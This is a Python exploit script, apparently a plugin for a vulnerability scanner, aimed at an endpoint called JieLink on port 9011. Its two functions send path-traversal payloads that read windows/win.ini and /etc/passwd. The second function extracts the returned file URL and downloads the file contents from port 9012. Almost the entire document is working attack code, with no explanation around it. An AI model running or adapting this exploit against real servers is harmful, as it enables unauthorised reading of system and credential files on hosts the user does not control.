import requests
import re

global file

def exp_check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url = url.split(":")
    url = url[0]+":"+url[1]+":9011"
    url1 = url+"/upload/DownUrlPhoto/JieLink"
    data = "appName=face&imgurl=c:/(/../../../../../file/2022/02/2)/../../../../../../../../../../../../../../../windows/win.ini&userId=33"
    data1 = "appName=face&imgurl=c:/(/../../../../../file/2022/02/2)/../../../../../../../../../../../../../../../etc/  passwd&userId=33"

    try:
        response = requests.post(url=url1,headers=headers,data=data,verify=False)
        response1 = requests.post(url=url1,headers=headers,data=data1,verify=False)
        if response.status_code==200 or response1.status_code==200:
            return 1
    except:
        return 3


def exp_others(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url = url.split(":")
    url = url[0]+":"+url[1]+":9011"
    url1 = url + "/upload/DownUrlPhoto/JieLink"
    data = "appName=face&imgurl=c:/(/../../../../../file/2022/02/2)/../../../../../../../../../../../../../../../windows/win.ini&userId=33"
    data1 = "appName=face&imgurl=c:/(/../../../../../file/2022/02/2)/../../../../../../../../../../../../../../../etc/passwd&userId=33"
    global file

    try:
        response = requests.post(url=url1, headers=headers, data=data, verify=False)
        response1 = requests.post(url=url1, headers=headers, data=data1, verify=False)
        if response.status_code==200:
            # a = response.json()
            # file = a.get("fileurl",None)
            file = re.findall('"fileurl":"(.*?)"', response.text)[0]
            file1 = file.replace('download','/down')
            url = url.split(":")
            url = url[0]+":"+url[1]+":9012"
            url2 = url + file1
            response3 = requests.get(url2)
            return response3.text
        if response1.status_code==200:
            # a = response.json()
            # file = a.get("fileurl",None)
            file = re.findall('"fileurl":"(.*?)"', response1.text)[0]
            file2 = file.replace("download","/down")
            url = url.split(":")
            url = url[0]+":"+url[1]+":9012"
            url3 = url + file2
            response4 = requests.get(url=url3)
            return response4.text
    except Exception as e:
        #print(str(e)+str(e.__traceback__.tb_lineno)+'行')
        return 3


